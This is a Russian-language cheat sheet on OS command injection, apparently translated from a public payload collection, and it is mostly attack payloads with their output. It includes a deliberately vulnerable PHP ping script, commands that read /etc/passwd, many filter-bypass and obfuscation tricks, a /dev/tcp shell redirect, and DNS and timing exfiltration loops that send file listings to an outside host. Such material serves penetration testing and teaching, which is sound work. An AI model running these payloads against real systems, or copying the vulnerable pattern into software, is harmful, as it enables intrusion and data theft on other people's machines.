## CMDi Внедрение команд

##### Внедрение команд — это уязвимость безопасности, которая позволяет злоумышленнику выполнять произвольные команды внутри уязвимого приложения.

Краткое содержание

    Инструменты
    Эксплойты
        Основные команды
        Объединение команд
        Внедрение аргументов
        Внутри команды
    Обходы фильтров
        Обход без пробела
        Обход с возвратом линии
        Обход с помощью обратной косой черты новой строки
        Обход фильтра символов через шестнадцатеричную кодировку
        Обход слов из черного списка
        Обход с одинарной кавычкой
        Обход с двойной кавычкой
        Обход с обратными кавычками
        Обход с помощью обратной косой черты и косой черты
        Обход с помощью $@
        Обход с помощью $()
        Байпас с переменным расширением
        Обход с подстановочными знаками
    Эксфильтрация данных
        Эксфильтрация данных по времени
        Кража данных на основе DNS
    Внедрение команд полиглота
    Трюки
        Фоновые длительные команды
        Удалить аргументы после инъекции
    Лаборатории
    Испытание
    Ссылки

Инструменты

commixproject/commix — автоматизированный универсальный инструмент для внедрения и использования команд ОС.
projectdiscovery/interactsh — серверная и клиентская библиотека, собирающая взаимодействие OOB.

Эксплойты

Внедрение команд, также известное как внедрение оболочки, — это тип атаки, при которой злоумышленник может выполнять произвольные команды в операционной системе хоста через уязвимое приложение. Эта уязвимость может существовать, когда приложение передает небезопасные данные, предоставленные пользователем (формы, файлы cookie, HTTP-заголовки и т. д.), в системную оболочку. В этом контексте системная оболочка представляет собой интерфейс командной строки, который обрабатывает команды, которые необходимо выполнить, обычно в системах Unix или Linux.

Опасность внедрения команд заключается в том, что оно может позволить злоумышленнику выполнить любую команду в системе, что потенциально может привести к полной компрометации системы.

Пример внедрения команд с помощью PHP :
Предположим, у вас есть PHP-скрипт, который принимает пользовательский ввод для проверки связи с указанным IP-адресом или доменом:

<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>

В приведенном выше коде PHP-скрипт использует system() функция для выполнения ping команда с IP-адресом или доменом, предоставленным пользователем через ip ПОЛУЧИТЬ параметр.

Если злоумышленник предоставляет входные данные типа 8.8.8.8; cat /etc/passwd, фактическая команда, которая будет выполнена, будет такой: ping -c 4 8.8.8.8; cat /etc/passwd.

Это означает, что система сначала ping 8.8.8.8 а затем выполните cat /etc/passwd команда, которая будет отображать содержимое /etc/passwd файл, потенциально раскрывающий конфиденциальную информацию.
Основные команды

Выполните команду и вуаля :p

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...

Объединение команд

Во многих интерфейсах командной строки, особенно в Unix-подобных системах, есть несколько символов, которые можно использовать для объединения команд или управления ими.

    ; (Точка с запятой): позволяет последовательно выполнять несколько команд.
    && (И): выполнить вторую команду только в том случае, если первая команда выполнена успешно (возвращает нулевой статус выхода).
    || (ИЛИ): выполнять вторую команду только в случае сбоя первой команды (возвращает ненулевой статус выхода).
    & (Фоновый режим): выполнение команды в фоновом режиме, позволяющее пользователю продолжать использовать оболочку.
    | (Канал): принимает выходные данные первой команды и использует их в качестве входных данных для второй команды.

command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2

Внедрение аргументов

Получите возможность выполнения команды, если к существующей команде можно добавлять только аргументы. Используйте этот веб-сайт «Векторы внедрения аргументов — Sonar», чтобы найти аргумент, который необходимо ввести для выполнения команды.

    Хром

    chrome '--gpu-launcher="id>/tmp/foo"'

SSH

ssh '-oProxyCommand="touch /tmp/foo"' foo@foo

psql

psql -o'|id>/tmp/foo'

Внутри команды
Внедрение команд с помощью обратных кавычек.

original_cmd_by_server `cat /etc/passwd`

Внедрение команд с помощью замены

original_cmd_by_server $(cat /etc/passwd)

Обходы фильтров
Обход без пробела
$IFS — это специальная переменная оболочки, называемая внутренним разделителем полей. По умолчанию во многих оболочках он содержит пробельные символы (пробел, табуляция, новая строка). При использовании в команде оболочка интерпретирует $IFS как пространство. $IFS не работает напрямую в качестве разделителя в таких командах, как ls, wget; использовать ${IFS} вместо.

cat${IFS}/etc/passwd
ls${IFS}-la

В некоторых оболочках раскрытие скобок генерирует произвольные строки. При выполнении оболочка будет рассматривать элементы внутри фигурных скобок как отдельные команды или аргументы.

{cat,/etc/passwd}

Перенаправление ввода. Символ < сообщает оболочке прочитать содержимое указанного файла.

cat</etc/passwd
sh</dev/tcp/127.0.0.1/4242

Цитирование ANSI-C

X=$'uname\x20-a'&&$X

Символ табуляции иногда можно использовать как альтернативу пробелам. В ASCII символ табуляции представлен шестнадцатеричным значением. 09.

;ls%09-al%09/home

В Windows %VARIABLE:~start,length% — это синтаксис, используемый для операций с подстроками над переменными среды.

ping%CommonProgramFiles:~10,-18%127.0.0.1
ping%PROGRAMFILES:~10,-5%127.0.0.1

Обход с возвратом линии

Команды также можно запускать последовательно с символами новой строки.

original_cmd_by_server
ls

Обход с помощью обратной косой черты новой строки
Команды можно разбить на части, используя обратную косую черту, за которой следует перевод строки.

$ cat /et\
c/pa\
sswd

Форма в кодировке URL будет выглядеть так:

cat%20/et%5C%0Ac/pa%5C%0Asswd

Обход фильтра символов через шестнадцатеричную кодировку

swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash

Обход фильтра символов

Выполнение команд без обратной косой черты и косой черты — linux bash

swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash

Обход слов из черного списка
Обход с одинарной кавычкой

w'h'o'am'i
wh''oami

Обход с двойной кавычкой

w"h"o"am"i
wh""oami

Обход с обратными кавычками

wh``oami

Обход с помощью обратной косой черты и косой черты

w\ho\am\i
/\b\i\n/////s\h

Обход с помощью $@

$0: Относится к имени сценария, если он запускается как сценарий. Если вы находитесь в сеансе интерактивной оболочки, $0 обычно дает имя оболочки.

who$@ami
echo whoami|$0

Обход с помощью $()

who$()ami
who$(echo am)i
who`echo am`i

Байпас с переменным расширением

/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}

Обход с подстановочными знаками

powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc

Эксфильтрация данных
Эксфильтрация данных по времени

Извлечение данных: посимвольно

swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s

Кража данных на основе DNS

На основе инструмента от https://github.com/HoLyVieR/dnsbin также размещен на dnsbin.zhack.ca

1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done

$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)

Онлайн-инструменты для проверки кражи данных на основе DNS:

    dnsbin.zhack.ca
    pingb.in

Внедрение команд полиглота

Полиглот — это часть кода, которая действительна и исполняема на нескольких языках программирования или средах одновременно. Когда мы говорим о «внедрении полиглотных команд», мы имеем в виду инъекцию полезных данных, которые могут выполняться в нескольких контекстах или средах.

    Пример 1:

    Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

    # Context inside commands with single and double quote:
    echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
    echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
    echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

Пример 2:

Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

# Context inside commands with single and double quote:
echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'

Трюки
Фоновые длительные команды

В некоторых случаях у вас может быть долго выполняющаяся команда, которая прерывается процессом, внедряющим ее, по истечении времени ожидания. С использованием nohup, вы можете продолжить работу процесса после завершения родительского процесса.

nohup sleep 120 > /dev/null &

Удалить аргументы после инъекции

В Unix-подобных интерфейсах командной строки -- Символ используется для обозначения конца опций команды. После --, все аргументы рассматриваются как имена файлов и аргументы, а не как параметры.
Лаборатории

    Внедрение команд ОС, простой случай
    Слепое внедрение команд ОС с задержками по времени
    Слепое внедрение команд ОС с перенаправлением вывода
    Слепое внедрение команд ОС с внеполосным взаимодействием
    Слепое внедрение команд ОС с внеполосной фильтрацией данных

Испытание

Задача, основанная на предыдущих трюках, что делает следующая команда:

g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}

Ссылки

    SECURITY CAFÉ — использование RCE на основе времени
    Опрос Bug Bounty — Windows RCE без пробелов
    Без PHP, без пробелов, без $, без { }, только bash - @asdizzle
    #bash #обфускация путем манипуляции со строками — Malwrologies, @DissectMalware
    Что такое внедрение команд ОС —portswigger
    Векторы внедрения аргументов — Сонар
